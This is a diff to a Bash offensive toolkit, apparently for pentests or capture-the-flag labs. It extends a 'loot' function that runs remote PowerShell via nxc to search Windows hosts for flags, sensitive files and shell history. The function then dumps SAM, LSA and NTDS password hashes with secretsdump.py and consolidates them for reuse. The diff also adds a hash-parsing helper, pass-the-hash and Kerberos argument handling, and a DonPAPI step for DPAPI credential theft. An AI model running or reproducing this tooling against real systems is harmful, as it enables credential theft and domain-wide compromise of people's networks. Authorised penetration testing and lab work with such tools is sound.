@@ -130,50 +130,63 @@ Usage: loot -t <target> -u <user> [-p <password> | -H <hash>] [-k] [-x <protocol
   echo -e "\033[0;36m[*] Searching for flag.txt \033[0m"
   cmd="Get-ChildItem -Path C:/ -Recurse -Force -Filter flag.txt -ErrorAction SilentlyContinue | Get-Content"
   echo -e "\033[0;34m[>] $cmd \033[0m"
-  nxc "$proto" "${nxc_auth[@]}" -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$'
+  nxc "$proto" "${nxc_auth[@]}" -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$' | sort -u
 
   echo -e "\033[0;36m[*] Searching for interesting files in user folders \033[0m"
-  cmd="Get-ChildItem -Path C:/Users -Recurse -Include *.config,*.xml,*.ini,*.json,*.yml,*.yaml,*.log,*.bak,*.old -ErrorAction SilentlyContinue"
+  cmd="Get-ChildItem -Path C:/Users -Force -Recurse -Depth 3 -Include *.config,*.xml,*.json,*.yml,*.yaml,*.log,*.bak,*.old, *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ps1,*.bat, *.exe -ErrorAction SilentlyContinue | Select-Object FullName"
   echo -e "\033[0;34m[>] $cmd \033[0m"
-  nxc "$proto" "${nxc_auth[@]}" -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$'
+  nxc "$proto" "${nxc_auth[@]}" -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$' | grep -vi 'appdata' | grep -vi 'local settings' | grep -vi 'application data' | sort -u
 
   echo -e "\033[0;36m[*] Extracting shell history (PowerShell and CMD) \033[0m"
   cmd="Get-ChildItem -Path C:/Users/*/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/*.txt -ErrorAction SilentlyContinue | ForEach-Object { Get-Content \$_.FullName -ErrorAction SilentlyContinue }"
   echo -e "\033[0;34m[>] $cmd \033[0m"
   nxc "$proto" "${nxc_auth[@]}" -X "$pwsh_wrapper$cmd" 2>/dev/null | tail -n +4 | tr -s " " | cut -d " " -f 5- | grep -v -e '^$'
 
-   # --- SecretsDump.py Integration ---
+  # --- SecretsDump.py Integration ---
   echo -e "\033[1;35m[!] Dumping credentials with secretsdump.py... \033[0m"
   
   # Check if secretsdump.py is available
   if ! command -v secretsdump.py &>/dev/null; then
     echo -e "\033[1;31m[!] secretsdump.py not found. Skipping credential dump.\033[0m"
   else
-    # Create secretsdump directory if it doesn't exist
+    # Create secretsdump directory if it doesn't exist (for original secretsdump output files)
     mkdir -p "./secretsdump" 2>/dev/null
     
-    # Define output base path for secretsdump.py
+    # Define output base path for secretsdump.py (saves to ./secretsdump/)
     local secretsdump_output_base="./secretsdump/$target_arg-secrets"
-    local parsed_sam_file="./${target_arg}.sam.parsed"
+    
+    # Define path for the parsed file specific to this target (saved to current directory)
+    local this_target_parsed_file="./${target_arg}-secrets.parsed"
+    # Define path for the ALL targets consolidated parsed file (saved to current directory)
+    local all_parsed_hashes_file_root="./all-secrets.parsed"
+    
+    # Temporary file to collect hashes for THIS target before consolidation
+    local tmp_this_target_collection=$(mktemp)
+    # Ensure this temporary collection file is cleaned up on exit (only for this script execution)
+    trap 'rm -f "$tmp_this_target_collection"' EXIT TERM # Re-trap with temp file
 
     echo -e "\033[0;36m[*] Running secretsdump.py to extract hashes... \033[0m"
     
-    # Construct secretsdump command using pure username and target IP.
-    # $user contains the username without domain (from get_auth processing).
-    # $target_arg is the IP passed to loot.
-    local secretsdump_target_user_string=""
-    if [[ -n "$user" ]]; then # Only add user if it's not empty
-        secretsdump_target_user_string="$user@"
-    fi
-    secretsdump_target_user_string+="$target_arg" # Final string is user@target or @target
-
+    # Construct secretsdump command arguments
     local secretsdump_cmd_args=()
-    secretsdump_cmd_args+=("$secretsdump_target_user_string")
+    local target_auth_string="" # This will be the main 'user:pass@target' or 'user@target' string
+
+    # Start with username part. $user is clean username, $password is the password.
+    if [[ -n "$user" ]]; then
+        target_auth_string="$user"
+        if [[ "$auth" == "password" ]]; then
+            target_auth_string+=":$password" # Append password directly if authentication is by password
+        fi
+        target_auth_string+="@$target_arg" # Append target
+    else
+        # If no user, it's anonymous. secretsdump.py sometimes allows @target_arg for null session
+        target_auth_string="@$target_arg" 
+    fi
+
+    secretsdump_cmd_args+=("$target_auth_string") # Add the constructed string as the first argument
     
-    # Add authentication arguments based on $auth
-    if [[ "$auth" == "password" ]]; then
-      secretsdump_cmd_args+=("-p" "$password")
-    elif [[ "$auth" == "hashes" ]]; then
+    # Add authentication flags only if not embedded in the target_auth_string
+    if [[ "$auth" == "hashes" ]]; then
       secretsdump_cmd_args+=("-hashes" ":$hashes")
     elif [[ "$auth" == "kerb" ]]; then
       secretsdump_cmd_args+=("-k" "-no-pass") # secretsdump can use kerberos ticket
@@ -184,16 +197,63 @@ Usage: loot -t <target> -u <user> [-p <password> | -H <hash>] [-k] [-x <protocol
     echo -e "\033[0;34m[>] secretsdump.py ${secretsdump_cmd_args[@]} \033[0m"
     # Execute secretsdump.py silently, as its output is saved to files
     secretsdump.py "${secretsdump_cmd_args[@]}" >/dev/null 2>&1
-
-    if [[ -f "${secretsdump_output_base}.sam" ]]; then
-      echo -e "\033[0;36m[*] Extracted SAM hashes, parsing to user:hash format... \033[0m"
-      # Read the .sam file, parse user:hash (field 1:field 4 for NTLM hash), and save to a new file
-      cat "${secretsdump_output_base}.sam" | awk -F: '{print $1":"$4}' | tee "$parsed_sam_file"
-      echo -e "\033[0;34m[*] Parsed SAM hashes saved to '$parsed_sam_file'. \033[0m"
-    else
-      echo -e "\033[1;31m[!] secretsdump.py did not produce a .sam file. Check authentication or logs.\033[0m"
+    
+    # Track if any secretsdump output files were produced FOR THIS TARGET
+    local secretsdump_output_found=0
+    if [[ -f "${secretsdump_output_base}.sam" || -f "${secretsdump_output_base}.secrets" || -f "${secretsdump_output_base}.ntds" ]]; then
+        secretsdump_output_found=1
     fi
-  fi
+
+    if [[ "$secretsdump_output_found" -eq 1 ]]; then
+      echo -e "\033[0;36m[*] Extracted secrets for $target_arg found. Parsing and consolidating for this target... \033[0m"
+      
+      # Process .sam file FOR THIS TARGET
+      if [[ -f "${secretsdump_output_base}.sam" ]]; then
+          echo -e "\033[0;36m[*] Parsing SAM hashes from ${secretsdump_output_base}.sam... \033[0m"
+          # Only tee to tmp_this_target_collection
+          cat "${secretsdump_output_base}.sam" | awk -F: '{print $1":"$4}' >> "$tmp_this_target_collection"
+      fi
+
+      # Process .secrets file (LSA Secrets) FOR THIS TARGET
+      if [[ -f "${secretsdump_output_base}.secrets" ]]; then
+          echo -e "\033[0;36m[*] Parsing LSA secrets from ${secretsdump_output_base}.secrets... \033[0m"
+          # Use grep -oP to find lines resembling hashes, then awk for user:hash
+          cat "${secretsdump_output_base}.secrets" | grep -oP '^\w+:\d+:[0-9a-f]{32}:[0-9a-f]{32}' | awk -F: '{print $1":"$4}' >> "$tmp_this_target_collection"
+      fi
+
+      # Process .ntds file (NTDS.DIT hashes) FOR THIS TARGET
+      if [[ -f "${secretsdump_output_base}.ntds" ]]; then
+          echo -e "\033[0;36m[*] Parsing NTDS hashes from ${secretsdump_output_base}.ntds... \033[0m"
+          cat "${secretsdump_output_base}.ntds" | awk -F: '{print $1":"$4}' >> "$tmp_this_target_collection"
+      fi
+
+      # Consolidate all hashes collected FOR THIS TARGET into its specific .parsed file
+      if [[ -s "$tmp_this_target_collection" ]]; then
+        sort -u "$tmp_this_target_collection" | tee "$this_target_parsed_file" # tee to screen AND to this target's .parsed file
+        echo -e "\033[0;34m[*] Parsed hashes for $target_arg saved to '$this_target_parsed_file'. \033[0m"
+      else
+        echo -e "\033[0;33m[*] No hashes extracted or found for $target_arg in SAM/LSA/NTDS files.\033[0m"
+      fi
+
+      # --- Consolidate ALL TARGETS' Hashes into all-secrets.parsed ---
+      echo -e "\033[0;36m[*] Consolidating all collected hashes from all targets... \033[0m"
+      # Find all existing <target>-secrets.parsed files in the current directory
+      # Concatenate them, sort -u, and save to all-secrets.parsed
+      # Also tee the final output to the screen
+      find . -maxdepth 1 -type f -name "*-secrets.parsed" -print0 | xargs -0 cat 2>/dev/null | sort -u | tee "$all_parsed_hashes_file_root"
+
+      echo -e "\033[0;34m[*] All unique parsed hashes consolidated and saved to '$all_parsed_hashes_file_root'. \033[0m"
+
+    else # If secretsdump_output_found is 0
+      echo -e "\033[1;31m[!] secretsdump.py did not produce any .sam/.secrets/.ntds files for $target_arg. Check authentication or logs.\033[0m"
+    fi
+
+    # The temporary collection file ($tmp_this_target_collection) is removed by its trap on EXIT/TERM.
+    # Original secretsdump.py output files (.sam, .secrets, .ntds) are KEPT in ./secretsdump/ as per instruction.
+    
+  fi # End of secretsdump.py check
+
+  echo "" # Separator
 
   # --- DonPAPI Suggestion (Next Step) ---
   if ! command -v donpapi &>/dev/null; then
@@ -214,8 +274,8 @@ Usage: loot -t <target> -u <user> [-p <password> | -H <hash>] [-k] [-x <protocol
     # If user was "DOMAIN\Administrator", original_user_input is "DOMAIN\Administrator".
     
     if [[ -n "$donpapi_auth_arg_string" ]]; then
-        echo -e "\033[0;33m[*] Next Step: Try dumping DPAPI master keys and credentials with DonPAPI: \033[0m"
-        echo -e "\033[0;34m[>] donpapi collect -t $target_arg -u \"$original_user_input\" $donpapi_auth_arg_string --ntfile \"$parsed_sam_file\" \033[0m"
+        echo -e "\033[0;34m[*] Next Step: Try dumping DPAPI master keys and credentials with DonPAPI: \033[0m"
+        echo -e "\033[0;36m[>] donpapi collect -t $target_arg -u \"$original_user_input\" $donpapi_auth_arg_string --ntfile \"$all_parsed_hashes_file_root\" \033[0m"
     else
         echo -e "\033[0;33m[*] DonPAPI suggestion skipped: No password or hash provided for authentication.\033[0m"
     fi
@@ -224,6 +284,100 @@ Usage: loot -t <target> -u <user> [-p <password> | -H <hash>] [-k] [-x <protocol
 
   echo -e "\033[1;31m[*] Done. \033[0m"
 }
+
+# SECRETSSPARSE
+# Parses secretsdump.py output files (.sam, .secrets, .ntds) for user:hash (NTLM)
+# and consolidates them into a single, deduplicated .parsed file.
+# Usage: secretsparse <base_filename>
+# Example: secretsparse 172.16.1.200-secrets  (assumes files like 172.16.1.200-secrets.sam exist)
+#------------------------------------------------------------------------------------
+secretsparse() {
+  local usage="
+Usage: secretsparse <base_filename>
+  Parses secretsdump.py output files (.sam, .secrets, .ntds) for user:hash (NTLM)
+  and consolidates them into a single, deduplicated .parsed file.
+
+  <base_filename>  The base name of the secretsdump.py output files (e.g., '172.16.1.200-secrets').
+                   Files like <base_filename>.sam, <base_filename>.secrets, <base_filename>.ntds
+                   are expected in the current directory or ./secretsdump/.
+"
+  if [[ $# -eq 0 || "$1" == "-h" || "$1" == "--help" ]]; then
+    echo "$usage"
+    return 1
+  fi
+
+  local base_filename="$1"
+  local base_path_secretsdump="./secretsdump/$base_filename" # Path where secretsdump saves originals
+  local output_parsed_file="./${base_filename}.parsed"        # Final parsed output file in current dir
+  local tmp_collection_file=$(mktemp) # Temp file to collect hashes before final sort -u
+
+  # Trap to ensure temporary collection file is removed on exit
+  trap 'rm -f "$tmp_collection_file"' EXIT TERM
+  trap 'echo ""' INT # Standard ezpz skip behavior
+
+  echo -e "\033[1;35m[!] Starting secrets parsing for '$base_filename'...\033[0m"
+
+  local hashes_found_for_this_run=0
+
+  # --- Process .sam file ---
+  if [[ -f "${base_path_secretsdump}.sam" ]]; then
+    echo -e "\033[0;36m[*] Parsing SAM hashes from ${base_path_secretsdump}.sam... \033[0m"
+    # Print to screen and redirect to temp collection file
+    cat "${base_path_secretsdump}.sam" | awk -F: '{print $1":"$4}' | tee /dev/tty >> "$tmp_collection_file"
+    hashes_found_for_this_run=1
+  else
+    echo -e "\033[0;33m[*] SAM file not found: ${base_path_secretsdump}.sam\033[0m"
+  fi
+  #echo "" # Separator
+
+  # --- Process .secrets file ---
+  if [[ -f "${base_path_secretsdump}.secrets" ]]; then
+    echo -e "\033[0;36m[*] Parsing LSA secrets from ${base_path_secretsdump}.secrets... \033[0m"
+    # Grep for lines that look like user:id:lm:nt (common secretsdump output)
+    # Then awk for user:nt_hash. Print to screen and redirect to temp collection file.
+    cat "${base_path_secretsdump}.secrets" | grep -oP '^\w+:\d+:[0-9a-f]{32}:[0-9a-f]{32}' | awk -F: '{print $1":"$4}' | tee /dev/tty >> "$tmp_collection_file"
+    hashes_found_for_this_run=1
+  else
+    echo -e "\033[0;33m[*] SECRETS file not found: ${base_path_secretsdump}.secrets\033[0m"
+  fi
+  #echo "" # Separator
+
+  # --- Process .ntds file ---
+  if [[ -f "${base_path_secretsdump}.ntds" ]]; then
+    echo -e "\033[0;36m[*] Parsing NTDS hashes from ${base_path_secretsdump}.ntds... \033[0m"
+    # Print to screen and redirect to temp collection file
+    cat "${base_path_secretsdump}.ntds" | awk -F: '{print $1":"$4}' | tee /dev/tty >> "$tmp_collection_file"
+    hashes_found_for_this_run=1
+  else
+    echo -e "\033[0;33m[*] NTDS file not found: ${base_path_secretsdump}.ntds\033[0m"
+  fi
+  #echo "" # Separator
+
+  # --- Final Consolidation ---
+  if [[ "$hashes_found_for_this_run" -eq 1 && -s "$tmp_collection_file" ]]; then
+    echo -e "\033[0;36m[*] Consolidating and deduplicating hashes for '$base_filename'... \033[0m"
+    sort -u "$tmp_collection_file" >> "$output_parsed_file" # Display on screen and save to .parsed
+    echo -e "\033[0;34m[*] Parsed hashes for '$base_filename' saved to '$output_parsed_file'. \033[0m"
+  else
+    echo -e "\033[0;33m[*] No hashes found or extracted for '$base_filename'.\033[0m"
+  fi
+  echo "" # Separator
+
+  # --- Update all-secrets.parsed ---
+  echo -e "\033[0;36m[*] Updating global 'all-secrets.parsed' with all unique hashes... \033[0m"
+  local all_parsed_hashes_file_root="./all-secrets.parsed"
+  # Find all existing <target>-secrets.parsed files in the current directory
+  # Concatenate them, sort -u, and save to all-secrets.parsed
+  # Also tee the final output to the screen
+  find . -maxdepth 1 -type f -name "*-secrets.parsed" -print0 | xargs -0 cat 2>/dev/null | sort -u  >> "$all_parsed_hashes_file_root"
+
+  echo -e "\033[0;34m[*] All unique parsed hashes consolidated and saved to '$all_parsed_hashes_file_root'. \033[0m"
+  echo "" # Separator
+
+  trap - INT EXIT TERM # Restore default traps
+  echo -e "\033[1;31m[*] Done. \033[0m"
+}
+
 
 # NETSCAN
 # Discovers live hosts on a network and performs port scans.
@@ -1441,15 +1595,16 @@ color() {
 
 # GET_AUTH
 # Parses authentication arguments and sets global arrays for nxc and impacket tools.
-# Handles DOMAIN\user format in username.
+# Handles DOMAIN\user format in username and complex domain scenarios.
 #------------------------------------------------------------------------------------
 get_auth() {
   # Unset global variables to ensure a clean state for each call
-  unset nxc_auth imp_auth target user password hashes auth domain dc_ip dc_fqdn original_user_input # Ensure original_user_input is unset too
-
+  unset nxc_auth imp_auth target user password hashes auth domain dc_ip dc_fqdn original_user_input
+  
   local kerb=0
   local current_user_input_raw="" # Capture the raw -u argument
   local user_param_was_passed=0 # Flag to check if -u was provided
+  local explicit_domain_arg="" # Stores domain from -d for disambiguation later
 
   # First pass to capture all parameters
   while [[ $# -gt 0 ]]; do
@@ -1460,7 +1615,7 @@ get_auth() {
       --hash | -H) hashes="$2"; auth="hashes"; shift 2 ;;
       --kcache) auth="kerb"; shift ;;
       --kerb | -k) kerb=1; shift ;;
-      --domain | -d) domain="$2"; shift 2 ;; # This is the *target domain*
+      --domain | -d) explicit_domain_arg="$2"; shift 2 ;; # Capture explicit -d arg
       --dc-ip) dc_ip="$2"; shift 2 ;;
       --dc-fqdn) dc_fqdn="$2"; shift 2 ;;
       --help | -h) return 1 ;; # Signal help requested to caller
@@ -1468,27 +1623,30 @@ get_auth() {
     esac
   done
 
-  # Process the user input: separate domain from username if DOMAIN\user format
-  if [[ -n "$current_user_input_raw" && "$current_user_input_raw" =~ "\\"(.*) ]]; then
-    # User contains a backslash (DOMAIN\user format)
-    local domain_in_user="${current_user_input_raw%\\*}"
-    user="${current_user_input_raw#*\\}" # Populate global 'user' variable with clean username
-    # This 'original_user_input' is what NXC will get for -u (e.g. DOMAIN\user)
-    original_user_input="$current_user_input_raw"
-    imp_user_part="$domain_in_user/$user" # For Impacket: DOMAIN/user
-    nxc_auth=("$target" -u "$original_user_input") # NXC likes DOMAIN\user
-  elif [[ -n "$current_user_input_raw" ]]; then
-    # User is just "user" (no domain in username)
-    user="$current_user_input_raw" # Populate global 'user' variable with the input
-    original_user_input="$current_user_input_raw" # Same for raw input
-    imp_user_part="$domain/$user" # For Impacket: target_domain/user
-    nxc_auth=("$target" -u "$original_user_input") # NXC gets simple user
-  else
-    # No user provided, anonymous/null session
-    user=""
-    original_user_input=""
-    imp_user_part="$domain/"
-    nxc_auth=("$target" -u '' -p '')
+  # Restore global 'domain' from explicit_domain_arg if it was passed
+  domain="$explicit_domain_arg"
+
+  # --- Process User Input and Determine Credential Domain ---
+  local credential_domain="" # Domain extracted from user string (e.g., CORP in CORP\user)
+  local username_clean=""    # Username part without any domain
+  
+  if [[ -n "$current_user_input_raw" ]]; then
+      if [[ "$current_user_input_raw" =~ "\\"(.*) ]]; then
+          # User contains a backslash (DOMAIN\user format)
+          credential_domain="${current_user_input_raw%\\*}"
+          username_clean="${current_user_input_raw#*\\}"
+          user="$username_clean" # Set global 'user' to the clean username
+          original_user_input="$current_user_input_raw" # Keep raw input for NXC/DonPAPI
+      else
+          # User is just "user" (no domain in username)
+          username_clean="$current_user_input_raw"
+          user="$username_clean" # Set global 'user' to the clean username
+          original_user_input="$current_user_input_raw" # Keep raw input for NXC/DonPAPI
+      fi
+  else # No user provided (anonymous/null session)
+      user=""
+      username_clean=""
+      original_user_input=""
   fi
 
   [[ "$password" == "''" ]] && password="" # Handle empty string for password
@@ -1500,19 +1658,22 @@ get_auth() {
   fi
 
   # --- Determine Target Domain for DC (for -dc-ip, -dc-host) ---
+  # If 'domain' (from -d) is still empty, try to infer it from /etc/hosts for DC resolution
   if [[ -z "$domain" ]]; then
     domain=$(awk 'tolower($0) ~ /dc/ {print $5; exit}' /etc/hosts)
-    [[ -z "$domain" ]] && echo -e "\033[1;33m[!] Target domain not found. Some features may fail. Use --domain or -d. \033[0m"
+    [[ -z "$domain" ]] && echo -e "\033[1;33m[!] Target domain not provided (-d) and not found in /etc/hosts. Some features may fail. \033[0m"
   fi
 
+  # If DC IP not provided, try to infer from /etc/hosts using the determined target domain
   if [[ -z "$dc_ip" ]]; then
     dc_ip=$(awk -v dom="$domain" 'tolower($0) ~ tolower(dom) && tolower($0) ~ /dc/ {print $1; exit}' /etc/hosts)
     if [[ -z "$dc_ip" ]]; then
-      dc_ip="$target"
+      dc_ip="$target" # Fallback to target IP itself as DC IP
       echo -e "\033[1;33m[!] DC IP not found for domain '$domain'. Using target '$target' as DC IP. Use --dc-ip to specify. \033[0m"
     fi
   fi
 
+  # If DC FQDN not provided, try to infer from /etc/hosts using the determined target domain
   if [[ -z "$dc_fqdn" ]]; then
     dc_fqdn=$(awk -v dom="$domain" 'tolower($0) ~ tolower(dom) && tolower($0) ~ /dc/ {print $4; exit}' /etc/hosts)
     [[ -z "$dc_fqdn" ]] && echo -e "\033[1;33m[!] DC FQDN not found for domain '$domain'. Kerberos auth may fail. Use --dc-fqdn. \033[0m"
@@ -1527,42 +1688,85 @@ get_auth() {
     fi
   fi
 
-  # --- Build Impacket Authentication Array ---
-  # Reconstruct imp_user_part, adding password/hash details
+  # --- Build imp_auth: This is the critical part for the 5 scenarios ---
+  local imp_auth_initial_part="" # This will be USER or DOMAIN/USER for Impacket
+
+  if [[ -n "$username_clean" ]]; then # If a user was provided (not anonymous)
+      if [[ -n "$credential_domain" ]]; then
+          # Scenario 3, 4, 5: User passed with domain (e.g., CORP\user)
+          imp_auth_initial_part="$credential_domain/$username_clean"
+      elif [[ -n "$domain" ]]; then
+          # Scenario 2: User passed without domain, but -d DOMAIN was used
+          imp_auth_initial_part="$domain/$username_clean"
+      else
+          # Scenario 1: User passed without domain, and no -d DOMAIN.
+          imp_auth_initial_part="$username_clean"
+      fi
+  elif [[ -n "$domain" ]]; then
+      # Anonymous session, but -d DOMAIN was used
+      imp_auth_initial_part="$domain/"
+  else
+      # Truly anonymous session, no domain provided at all
+      imp_auth_initial_part=""
+  fi
+
+  # Add password/hash to imp_auth_initial_part
   case "$auth" in
     password)
-      imp_user_part="$imp_user_part:$password"
-      nxc_auth+=(-p "$password")
+      # Append password if imp_auth_initial_part is not empty (i.e. user/domain was set)
+      if [[ -n "$imp_auth_initial_part" ]]; then
+        imp_auth_initial_part+=":$password"
+      else # Anonymous session with password? Fallback to just :password if no user/domain part
+        imp_auth_initial_part=":$password"
+      fi
+      nxc_auth=("$target" -u "$original_user_input" -p "$password")
       ;;
     hashes)
-      # Hashes are appended as separate arguments later, so imp_user_part is just user/domain part
-      nxc_auth+=(-H "$hashes")
+      # Hashes are appended as separate arguments later, so imp_auth_initial_part is just user/domain part
+      nxc_auth=("$target" -u "$original_user_input" -H "$hashes")
       ;;
     kerb)
-      # Kerberos is handled by flags, imp_user_part is just user/domain part
-      nxc_auth+=(-u "$user" --use-kcache)
+      # Kerberos is handled by flags, imp_auth_initial_part is just user/domain part
+      nxc_auth=("$target" -u "$original_user_input" --use-kcache)
+      ;;
+
+    *)
+      # Anonymous, no password, no hash, no kerb
+      nxc_auth=("$target" -u '' -p '')
       ;;
   esac
 
   # Now build the full imp_auth array, which will be passed to impacket tools
-  imp_auth=("$imp_user_part")
+  imp_auth=("$imp_auth_initial_part") # Start with the constructed user/domain/pass string
+
+  # Add specific Impacket flags based on authentication type
   if [[ "$auth" == "hashes" ]]; then
     imp_auth+=("-hashes" ":$hashes")
   fi
-  if [[ "$auth" == "kerb" ]]; then # If auth is kerb from kcache, or -k flag was passed
+  if [[ "$auth" == "kerb" ]]; then # If auth is kerb from kcache
     imp_auth+=("-k" "-no-pass")
   fi
-  # Add -dc-ip and potentially -dc-host (for kerberos)
-  imp_auth+=("-dc-ip" "$dc_ip")
+  
+  # Append -target-domain for Scenario 5: Credential domain is different from target domain (-d)
+  if [[ -n "$credential_domain" && -n "$domain" && "$credential_domain" != "$(echo "$domain" | tr '[:lower:]' '[:upper:]')" && "$credential_domain" != "$(echo "$domain" | tr '[:upper:]' '[:lower:]')" ]]; then
+      # Case-insensitive comparison for domain names
+      imp_auth+=("-target-domain" "$domain")
+  fi
+
+  # Append -dc-ip and -dc-host (for kerberos)
+  if [[ -n "$dc_ip" ]]; then
+      imp_auth+=("-dc-ip" "$dc_ip")
+  fi
+  # Note: -dc-host is added by Impacket's -k flag internally if not provided,
+  # or is explicitly needed for kerb when original_user_input is just 'user'.
   if [[ $kerb -eq 1 || "$auth" == "kerb" ]]; then # Only add -dc-host if kerberos is used
     [[ -n "$dc_fqdn" ]] && imp_auth+=("-dc-host" "$dc_fqdn")
   fi
 
-  # Add Kerberos flag to nxc_auth if specified
+  # Add Kerberos flag to nxc_auth if specified (redundant for --use-kcache but good for consistency)
   [[ $kerb -eq 1 ]] && nxc_auth+=(-k)
 
   # Export global variables to be accessible by the calling functions
-  # Ensure `user` and `original_user_input` are properly exported
-  export nxc_auth imp_auth target user domain dc_ip dc_fqdn original_user_input password hashes auth kerb
+  export nxc_auth imp_auth target user domain dc_ip dc_fqdn original_user_input password hashes auth kerb username_clean credential_domain
   return 0
 }
